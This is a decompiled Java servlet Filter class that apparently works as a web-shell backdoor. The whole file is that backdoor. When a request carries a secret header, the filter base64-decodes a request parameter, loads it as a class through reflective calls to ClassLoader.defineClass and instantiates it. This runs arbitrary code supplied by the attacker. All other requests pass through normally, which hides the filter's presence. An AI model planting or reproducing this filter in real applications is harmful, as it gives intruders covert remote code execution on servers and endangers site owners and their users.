package com.example.demo.Static;

//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class xxx implements Filter {
    public String pass = "x";
    public String headerName = "xxx";
    public String headerValue = "xxx";

    public xxx() {
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest)servletRequest;
        HttpServletResponse response = (HttpServletResponse)servletResponse;

        try {
            if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                String cls = request.getParameter(this.pass);
                if (cls != null) {
                    try {
                        byte[] data = this.doBase64Decode(cls);
                        URLClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                        method.setAccessible(true);
                        Class clazz = (Class)method.invoke(classLoader, data, new Integer(0), new Integer(data.length));
                        clazz.newInstance().equals(new Object[]{request, response});
                    } catch (Exception var11) {
                    }
                }
            } else {
                filterChain.doFilter(servletRequest, servletResponse);
            }
        } catch (Exception var12) {
            filterChain.doFilter(servletRequest, servletResponse);
        }

    }

    public byte[] doBase64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])((byte[])((byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str))));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])((byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str))));
        }
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void destroy() {
    }
}

